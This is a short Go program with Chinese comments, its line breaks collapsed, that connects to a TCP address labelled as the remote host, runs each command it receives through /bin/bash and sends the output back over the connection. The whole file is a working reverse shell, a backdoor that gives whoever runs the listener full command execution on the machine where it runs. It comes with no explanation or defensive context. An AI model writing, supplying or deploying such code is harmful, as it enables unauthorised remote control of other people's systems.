```
package mainimport (    "io"    "net"    "io/ioutil"    "log"    "os/exec" ) var (    cmd string    line string) func main() {    addr := "127.0.0.1:8080" //远程连接主机名    conn,err := net.Dial("tcp",addr) //拨号操作，用于连接服务端，需要指定协议。    if err != nil {        log.Fatal(err)    }     buf := make([]byte,10240) //定义一个切片的长度是10240。    for  {        n,err := conn.Read(buf) //接受的命令        if err != nil && err != io.EOF {  //io.EOF在网络编程中表示对端把链接关闭了。            log.Fatal(err)        }         cmd_str := string(buf[:n])        cmd := exec.Command("/bin/bash","-c",cmd_str) //命令执行        stdout, err := cmd.StdoutPipe()        if err != nil {            log.Fatal(err)        }        defer stdout.Close()        if err := cmd.Start(); err != nil {            log.Fatal(err)        }        opBytes, err := ioutil.ReadAll(stdout)        if err != nil {            log.Fatal(err)        }        conn.Write([]byte(opBytes)) //返回执行结果    }}
```
